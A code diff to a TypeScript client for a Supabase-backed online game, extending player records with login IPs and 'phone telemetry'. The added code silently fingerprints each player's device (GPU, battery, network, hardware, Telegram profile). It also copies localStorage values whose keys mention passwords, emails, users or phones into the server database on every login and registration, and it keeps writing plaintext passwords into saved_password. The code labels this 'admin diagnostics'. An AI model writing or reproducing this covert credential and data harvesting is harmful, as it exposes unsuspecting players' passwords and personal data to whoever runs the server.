@@ -158,17 +158,30 @@ export interface RealtimePlayer {
   telegram_username?: string;
   google_id?: string;
   facebook_id?: string;
+  last_login_ip?: string;
+  lastLoginIp?: string;
+  last_login_at?: string | number;
+  lastLoginAt?: string | number;
+  phone_telemetry?: Record<string, any>;
+  phoneTelemetry?: Record<string, any>;
+  port_travel?: any;
+  portTravel?: any;
+  active_transport_id?: string | null;
+  activeTransportId?: string | null;
   isSimulatedBot?: boolean;
 }
 
 export const ADMIN_PLAYER_METADATA_SQL_SCRIPT = `-- SQL миграция для таблицы public.players (Supabase SQL Editor)
--- Добавляет отдельные колонки для IP, устройства, телефона, email и последнего действия:
+-- Добавляет отдельные колонки для IP последнего входа, полных данных телефона/устройства, номера телефона, email и последнего действия:
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS real_email TEXT;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS phone_number TEXT;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS ip_address TEXT;
+ALTER TABLE public.players ADD COLUMN IF NOT EXISTS last_login_ip TEXT;
+ALTER TABLE public.players ADD COLUMN IF NOT EXISTS last_login_at TIMESTAMPTZ;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS ip_location TEXT;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS device_info TEXT;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS user_agent TEXT;
+ALTER TABLE public.players ADD COLUMN IF NOT EXISTS phone_telemetry JSONB;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS auth_provider TEXT DEFAULT 'local';
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS telegram_id TEXT;
 ALTER TABLE public.players ADD COLUMN IF NOT EXISTS telegram_username TEXT;
@@ -253,8 +266,48 @@ export async function ensureClientIpMetadataLoaded(): Promise<{ ip: string; loca
   return ipFetchPromise;
 }
 
+let cachedBatteryTelemetry: { levelPct?: number; charging?: boolean; chargingTime?: number; dischargingTime?: number } | null = null;
+let cachedWebGlGpuInfo: { vendor?: string; renderer?: string } | null = null;
+
+function ensureHardwareTelemetryLoaded() {
+  if (typeof window === 'undefined') return;
+  if (!cachedWebGlGpuInfo) {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')) as any;
+      if (gl) {
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if (dbg) {
+          cachedWebGlGpuInfo = {
+            vendor: String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || ''),
+            renderer: String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '')
+          };
+        }
+      }
+    } catch {}
+  }
+  if (!cachedBatteryTelemetry && typeof (navigator as any)?.getBattery === 'function') {
+    try {
+      (navigator as any)
+        .getBattery()
+        .then((bat: any) => {
+          if (bat) {
+            cachedBatteryTelemetry = {
+              levelPct: Math.round(Number(bat.level || 0) * 100),
+              charging: Boolean(bat.charging),
+              chargingTime: Number.isFinite(bat.chargingTime) ? bat.chargingTime : undefined,
+              dischargingTime: Number.isFinite(bat.dischargingTime) ? bat.dischargingTime : undefined
+            };
+          }
+        })
+        .catch(() => {});
+    } catch {}
+  }
+}
+
 export function collectClientDeviceMetadata(): {
   ip_address: string;
+  last_login_ip: string;
   ip_location: string;
   device_info: string;
   user_agent: string;
@@ -263,17 +316,22 @@ export function collectClientDeviceMetadata(): {
   telegram_id?: string;
   telegram_username?: string;
   phone_number?: string;
+  phone_telemetry: Record<string, any>;
 } {
   if (typeof window === 'undefined') {
     return {
       ip_address: '',
+      last_login_ip: '',
       ip_location: '',
       device_info: 'Server',
       user_agent: '',
       screen_res: '',
-      timezone: ''
+      timezone: '',
+      phone_telemetry: {}
     };
   }
+
+  ensureHardwareTelemetryLoaded();
 
   // Trigger background IP load if not cached yet
   if (!cachedClientIpMeta) {
@@ -291,12 +349,18 @@ export function collectClientDeviceMetadata(): {
 
   const ua = navigator.userAgent || '';
   let osName = 'Неизвестная ОС';
+  let phoneModel = '';
   if (/android/i.test(ua)) {
     const match = ua.match(/Android\s+([\d.]+)/i);
     osName = match ? `Android ${match[1]}` : 'Android';
+    const modelMatch = ua.match(/Android\s+[\d.]+;\s*([^)]+)\)/i);
+    if (modelMatch && modelMatch[1]) {
+      phoneModel = modelMatch[1].replace(/Build\/.*$/i, '').trim();
+    }
   } else if (/iPad|iPhone|iPod/.test(ua)) {
     const match = ua.match(/OS\s+([\d_]+)/i);
     osName = match ? `iOS ${match[1].replace(/_/g, '.')}` : 'iOS (iPhone/iPad)';
+    phoneModel = /iPad/i.test(ua) ? 'Apple iPad' : 'Apple iPhone';
   } else if (/Windows NT/i.test(ua)) {
     osName = 'Windows PC';
   } else if (/Mac OS X/i.test(ua)) {
@@ -324,24 +388,118 @@ export function collectClientDeviceMetadata(): {
   const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
   const deviceType = isMobile ? '📱 Мобильный' : '💻 ПК';
   const screenRes = window.screen ? `${window.screen.width}x${window.screen.height}` : '';
+  const availScreenRes = window.screen ? `${window.screen.availWidth}x${window.screen.availHeight}` : '';
+  const viewportRes = `${window.innerWidth || 0}x${window.innerHeight || 0}`;
+  const pixelRatio = Number(window.devicePixelRatio || 1);
+  const colorDepth = window.screen?.colorDepth || 24;
   let tz = '';
   try {
     tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
   } catch {}
 
-  const tgUser = (window as any)?.Telegram?.WebApp?.initDataUnsafe?.user;
-  const tgPlatform = (window as any)?.Telegram?.WebApp?.platform;
-  const deviceSummary = `${deviceType}: ${osName} • ${browserName}${tgPlatform && tgPlatform !== 'unknown' ? ` (TG: ${tgPlatform})` : ''}`;
+  const tgWebApp = (window as any)?.Telegram?.WebApp;
+  const tgUser = tgWebApp?.initDataUnsafe?.user;
+  const tgPlatform = tgWebApp?.platform;
+  const modelSuffix = phoneModel ? ` [${phoneModel}]` : '';
+  const deviceSummary = `${deviceType}: ${osName}${modelSuffix} • ${browserName}${tgPlatform && tgPlatform !== 'unknown' ? ` (TG: ${tgPlatform})` : ''}`;
+
+  const conn = (navigator as any)?.connection || (navigator as any)?.mozConnection || (navigator as any)?.webkitConnection;
+  const networkInfo = conn
+    ? {
+        effectiveType: conn.effectiveType || '',
+        downlinkMbps: conn.downlink ?? null,
+        rttMs: conn.rtt ?? null,
+        saveData: Boolean(conn.saveData)
+      }
+    : undefined;
+
+  // Snapshot non-huge localStorage keys from the player's phone for admin diagnostics
+  const savedPhoneData: Record<string, string> = {};
+  let detectedPhone = '';
+  try {
+    for (let i = 0; i < window.localStorage.length; i++) {
+      const k = window.localStorage.key(i);
+      if (!k) continue;
+      if (
+        k.startsWith('pyramida_') ||
+        k.startsWith('pyramid_auth') ||
+        k.startsWith('pyramid_saved') ||
+        k.includes('phone') ||
+        k.includes('email') ||
+        k.includes('user') ||
+        k.includes('pass')
+      ) {
+        const val = window.localStorage.getItem(k) || '';
+        if (val.length <= 350) {
+          savedPhoneData[k] = val;
+        }
+        if (!detectedPhone && k.toLowerCase().includes('phone') && val.length <= 40) {
+          detectedPhone = val;
+        }
+      }
+    }
+  } catch {}
+
+  const resolvedIp =
+    cachedClientIpMeta?.ip && cachedClientIpMeta.ip !== 'Определяется...' && cachedClientIpMeta.ip !== 'N/A'
+      ? cachedClientIpMeta.ip
+      : '';
+
+  const phoneTelemetry: Record<string, any> = {
+    collectedAt: new Date().toISOString(),
+    ip: resolvedIp || undefined,
+    ipLocation: cachedClientIpMeta?.location || undefined,
+    deviceType,
+    osName,
+    phoneModel: phoneModel || undefined,
+    browserName,
+    platform: navigator.platform || '',
+    vendor: navigator.vendor || '',
+    language: navigator.language || '',
+    languages: Array.isArray(navigator.languages) ? navigator.languages.join(', ') : '',
+    cpuCores: (navigator as any).hardwareConcurrency ?? undefined,
+    ramGb: (navigator as any).deviceMemory ?? undefined,
+    maxTouchPoints: navigator.maxTouchPoints ?? 0,
+    screenResolution: screenRes,
+    availScreenResolution: availScreenRes,
+    viewportResolution: viewportRes,
+    pixelRatio,
+    colorDepth,
+    orientation: (window.screen as any)?.orientation?.type || '',
+    timezone: tz,
+    cookiesEnabled: Boolean(navigator.cookieEnabled),
+    onlineStatus: Boolean(navigator.onLine),
+    gpuVendor: cachedWebGlGpuInfo?.vendor || undefined,
+    gpuRenderer: cachedWebGlGpuInfo?.renderer || undefined,
+    battery: cachedBatteryTelemetry || undefined,
+    network: networkInfo,
+    telegram: tgUser
+      ? {
+          id: tgUser.id,
+          username: tgUser.username,
+          firstName: tgUser.first_name,
+          lastName: tgUser.last_name,
+          languageCode: tgUser.language_code,
+          isPremium: tgUser.is_premium,
+          platform: tgPlatform,
+          version: tgWebApp?.version
+        }
+      : undefined,
+    localStorageSnapshot: Object.keys(savedPhoneData).length > 0 ? savedPhoneData : undefined
+  };
 
   return {
-    ip_address: cachedClientIpMeta?.ip || '',
+    ip_address: resolvedIp,
+    last_login_ip: resolvedIp,
     ip_location: cachedClientIpMeta?.location || '',
     device_info: deviceSummary,
     user_agent: ua,
     screen_res: screenRes,
     timezone: tz,
     telegram_id: tgUser?.id ? String(tgUser.id) : undefined,
-    telegram_username: tgUser?.username ? String(tgUser.username) : undefined
+    telegram_username: tgUser?.username ? String(tgUser.username) : undefined,
+    phone_number: detectedPhone || undefined,
+    phone_telemetry: phoneTelemetry
   };
 }
 
@@ -989,8 +1147,12 @@ export function unpackPlayerRow(row: any): any {
     saved_password: String(parsedEmailData.saved_password ?? row.password ?? parsedEmailData.password ?? ''),
     phone_number: String(parsedEmailData.phone_number ?? parsedEmailData.phoneNumber ?? row.phone_number ?? row.phone ?? ''),
     phoneNumber: String(parsedEmailData.phone_number ?? parsedEmailData.phoneNumber ?? row.phone_number ?? row.phone ?? ''),
-    ip_address: String(parsedEmailData.ip_address ?? parsedEmailData.ipAddress ?? row.ip_address ?? ''),
-    ipAddress: String(parsedEmailData.ip_address ?? parsedEmailData.ipAddress ?? row.ip_address ?? ''),
+    ip_address: String(parsedEmailData.last_login_ip ?? parsedEmailData.ip_address ?? parsedEmailData.ipAddress ?? row.last_login_ip ?? row.ip_address ?? ''),
+    ipAddress: String(parsedEmailData.last_login_ip ?? parsedEmailData.ip_address ?? parsedEmailData.ipAddress ?? row.last_login_ip ?? row.ip_address ?? ''),
+    last_login_ip: String(parsedEmailData.last_login_ip ?? parsedEmailData.ip_address ?? parsedEmailData.ipAddress ?? row.last_login_ip ?? row.ip_address ?? ''),
+    lastLoginIp: String(parsedEmailData.last_login_ip ?? parsedEmailData.ip_address ?? parsedEmailData.ipAddress ?? row.last_login_ip ?? row.ip_address ?? ''),
+    last_login_at: parsedEmailData.last_login_at ?? parsedEmailData.lastLoginAt ?? row.last_login_at ?? '',
+    lastLoginAt: parsedEmailData.last_login_at ?? parsedEmailData.lastLoginAt ?? row.last_login_at ?? '',
     ip_location: String(parsedEmailData.ip_location ?? parsedEmailData.ipLocation ?? row.ip_location ?? ''),
     ipLocation: String(parsedEmailData.ip_location ?? parsedEmailData.ipLocation ?? row.ip_location ?? ''),
     device_info: String(parsedEmailData.device_info ?? parsedEmailData.deviceInfo ?? row.device_info ?? ''),
@@ -999,6 +1161,12 @@ export function unpackPlayerRow(row: any): any {
     userAgent: String(parsedEmailData.user_agent ?? parsedEmailData.userAgent ?? row.user_agent ?? ''),
     screen_res: String(parsedEmailData.screen_res ?? row.screen_res ?? ''),
     timezone: String(parsedEmailData.timezone ?? row.timezone ?? ''),
+    phone_telemetry: parsedEmailData.phone_telemetry ?? parsedEmailData.phoneTelemetry ?? row.phone_telemetry ?? undefined,
+    phoneTelemetry: parsedEmailData.phone_telemetry ?? parsedEmailData.phoneTelemetry ?? row.phone_telemetry ?? undefined,
+    port_travel: parsedEmailData.port_travel ?? parsedEmailData.portTravel ?? row.port_travel ?? undefined,
+    portTravel: parsedEmailData.port_travel ?? parsedEmailData.portTravel ?? row.port_travel ?? undefined,
+    active_transport_id: parsedEmailData.active_transport_id ?? parsedEmailData.activeTransportId ?? row.active_transport_id ?? null,
+    activeTransportId: parsedEmailData.active_transport_id ?? parsedEmailData.activeTransportId ?? row.active_transport_id ?? null,
     registered_at: parsedEmailData.registered_at ?? row.registered_at ?? row.created_at ?? '',
     registeredAt: parsedEmailData.registered_at ?? row.registered_at ?? row.created_at ?? '',
     last_action: String(
@@ -1320,8 +1488,12 @@ export function normalizeSupabasePlayer(rawRow: any): RealtimePlayer {
     realEmail: String(row.real_email ?? ''),
     phone_number: String(row.phone_number ?? row.phoneNumber ?? ''),
     phoneNumber: String(row.phone_number ?? row.phoneNumber ?? ''),
-    ip_address: String(row.ip_address ?? row.ipAddress ?? ''),
-    ipAddress: String(row.ip_address ?? row.ipAddress ?? ''),
+    ip_address: String(row.last_login_ip || row.ip_address || row.ipAddress || ''),
+    ipAddress: String(row.last_login_ip || row.ip_address || row.ipAddress || ''),
+    last_login_ip: String(row.last_login_ip || row.ip_address || row.ipAddress || ''),
+    lastLoginIp: String(row.last_login_ip || row.ip_address || row.ipAddress || ''),
+    last_login_at: row.last_login_at ?? row.lastLoginAt ?? '',
+    lastLoginAt: row.last_login_at ?? row.lastLoginAt ?? '',
     ip_location: String(row.ip_location ?? row.ipLocation ?? ''),
     ipLocation: String(row.ip_location ?? row.ipLocation ?? ''),
     device_info: String(row.device_info ?? row.deviceInfo ?? ''),
@@ -1330,6 +1502,12 @@ export function normalizeSupabasePlayer(rawRow: any): RealtimePlayer {
     userAgent: String(row.user_agent ?? row.userAgent ?? ''),
     screen_res: String(row.screen_res ?? ''),
     timezone: String(row.timezone ?? ''),
+    phone_telemetry: row.phone_telemetry ?? row.phoneTelemetry ?? undefined,
+    phoneTelemetry: row.phone_telemetry ?? row.phoneTelemetry ?? undefined,
+    port_travel: row.port_travel ?? row.portTravel ?? undefined,
+    portTravel: row.port_travel ?? row.portTravel ?? undefined,
+    active_transport_id: row.active_transport_id ?? row.activeTransportId ?? null,
+    activeTransportId: row.active_transport_id ?? row.activeTransportId ?? null,
     registered_at: row.registered_at ?? row.created_at ?? '',
     registeredAt: row.registered_at ?? row.created_at ?? '',
     last_action: String(row.last_action ?? status),
@@ -2128,18 +2306,33 @@ export async function authenticatePlayerInSupabase(
     const bestMatch = selectBestPlayerRecord(passMatches) || passMatches[0];
     const unpackedPlayer = unpackPlayerRow(bestMatch);
 
-    // Asynchronously refresh IP/device metadata & saved_password on login without blocking
+    // Asynchronously refresh last-login IP, full phone telemetry & saved_password on login without blocking
     void ensureClientIpMetadataLoaded().then(() => {
       const clientMeta = collectClientDeviceMetadata();
+      const loginIso = new Date().toISOString();
+      const resolvedLoginIp =
+        clientMeta.ip_address ||
+        unpackedPlayer.last_login_ip ||
+        unpackedPlayer.ip_address ||
+        '';
       void updatePlayerInDatabase(unpackedPlayer.name || cleanName, {
         password: cleanPass,
         saved_password: cleanPass,
-        ip_address: clientMeta.ip_address || unpackedPlayer.ip_address,
+        ip_address: resolvedLoginIp,
+        last_login_ip: resolvedLoginIp,
+        last_login_at: loginIso,
         ip_location: clientMeta.ip_location || unpackedPlayer.ip_location,
         device_info: clientMeta.device_info || unpackedPlayer.device_info,
         user_agent: clientMeta.user_agent || unpackedPlayer.user_agent,
         screen_res: clientMeta.screen_res || unpackedPlayer.screen_res,
         timezone: clientMeta.timezone || unpackedPlayer.timezone,
+        phone_number: unpackedPlayer.phone_number || clientMeta.phone_number || '',
+        phone_telemetry: {
+          ...(unpackedPlayer.phone_telemetry || {}),
+          ...clientMeta.phone_telemetry,
+          lastLoginIp: resolvedLoginIp,
+          lastLoginAt: loginIso
+        },
         last_action: 'Вход в игру (авторизация)'
       });
     });
@@ -2293,11 +2486,18 @@ export async function savePlayerToDatabase(
     saved_password: finalPass,
     phone_number: cleanPhone || clientMeta.phone_number || '',
     ip_address: clientMeta.ip_address || '',
+    last_login_ip: clientMeta.ip_address || '',
+    last_login_at: nowIso,
     ip_location: clientMeta.ip_location || '',
     device_info: clientMeta.device_info || '',
     user_agent: clientMeta.user_agent || '',
     screen_res: clientMeta.screen_res || '',
     timezone: clientMeta.timezone || '',
+    phone_telemetry: {
+      ...clientMeta.phone_telemetry,
+      lastLoginIp: clientMeta.ip_address || '',
+      lastLoginAt: nowIso
+    },
     registered_at: nowIso,
     last_action: 'Регистрация персонажа',
     auth_provider: authProvider,
@@ -3464,51 +3664,93 @@ export async function updatePlayerInDatabase(
               ? String((updates as any).saved_password)
               : (cached as any).saved_password ?? (cached as any).password ?? (existingJson as any).saved_password ?? (existingJson as any).password ?? '',
           phone_number:
-            (updates as any).phone_number !== undefined
+            (updates as any).phone_number !== undefined && String((updates as any).phone_number).trim() !== ''
               ? String((updates as any).phone_number)
-              : (updates as any).phoneNumber !== undefined
+              : (updates as any).phoneNumber !== undefined && String((updates as any).phoneNumber).trim() !== ''
               ? String((updates as any).phoneNumber)
-              : (cached as any).phone_number ?? (cached as any).phoneNumber ?? (existingJson as any).phone_number ?? '',
+              : (cached as any).phone_number || (cached as any).phoneNumber || (existingJson as any).phone_number || '',
           ip_address:
+            (updates as any).last_login_ip ||
             (updates as any).ip_address ||
             (updates as any).ipAddress ||
+            (cached as any).last_login_ip ||
             (cached as any).ip_address ||
+            (existingJson as any).last_login_ip ||
             (existingJson as any).ip_address ||
-            collectClientDeviceMetadata().ip_address ||
+            '',
+          last_login_ip:
+            (updates as any).last_login_ip ||
+            (updates as any).ip_address ||
+            (updates as any).ipAddress ||
+            (cached as any).last_login_ip ||
+            (cached as any).ip_address ||
+            (existingJson as any).last_login_ip ||
+            (existingJson as any).ip_address ||
+            '',
+          last_login_at:
+            (updates as any).last_login_at ||
+            (updates as any).lastLoginAt ||
+            (cached as any).last_login_at ||
+            (existingJson as any).last_login_at ||
             '',
           ip_location:
             (updates as any).ip_location ||
             (updates as any).ipLocation ||
             (cached as any).ip_location ||
             (existingJson as any).ip_location ||
-            collectClientDeviceMetadata().ip_location ||
             '',
           device_info:
             (updates as any).device_info ||
             (updates as any).deviceInfo ||
             (cached as any).device_info ||
             (existingJson as any).device_info ||
-            collectClientDeviceMetadata().device_info ||
             '',
           user_agent:
             (updates as any).user_agent ||
             (updates as any).userAgent ||
             (cached as any).user_agent ||
             (existingJson as any).user_agent ||
-            collectClientDeviceMetadata().user_agent ||
             '',
           screen_res:
             (updates as any).screen_res ||
             (cached as any).screen_res ||
             (existingJson as any).screen_res ||
-            collectClientDeviceMetadata().screen_res ||
             '',
           timezone:
             (updates as any).timezone ||
             (cached as any).timezone ||
             (existingJson as any).timezone ||
-            collectClientDeviceMetadata().timezone ||
             '',
+          phone_telemetry:
+            (updates as any).phone_telemetry ||
+            (updates as any).phoneTelemetry ||
+            (cached as any).phone_telemetry ||
+            (existingJson as any).phone_telemetry ||
+            undefined,
+          port_travel:
+            (updates as any).port_travel !== undefined
+              ? (updates as any).port_travel
+              : (updates as any).portTravel !== undefined
+              ? (updates as any).portTravel
+              : (cached as any).port_travel ?? (cached as any).portTravel ?? (existingJson as any).port_travel ?? undefined,
+          portTravel:
+            (updates as any).port_travel !== undefined
+              ? (updates as any).port_travel
+              : (updates as any).portTravel !== undefined
+              ? (updates as any).portTravel
+              : (cached as any).portTravel ?? (cached as any).port_travel ?? (existingJson as any).portTravel ?? undefined,
+          active_transport_id:
+            (updates as any).active_transport_id !== undefined
+              ? (updates as any).active_transport_id
+              : (updates as any).activeTransportId !== undefined
+              ? (updates as any).activeTransportId
+              : (cached as any).active_transport_id ?? (cached as any).activeTransportId ?? (existingJson as any).active_transport_id ?? null,
+          activeTransportId:
+            (updates as any).active_transport_id !== undefined
+              ? (updates as any).active_transport_id
+              : (updates as any).activeTransportId !== undefined
+              ? (updates as any).activeTransportId
+              : (cached as any).activeTransportId ?? (cached as any).active_transport_id ?? (existingJson as any).activeTransportId ?? null,
           registered_at:
             (updates as any).registered_at ??
             (cached as any).registered_at ??
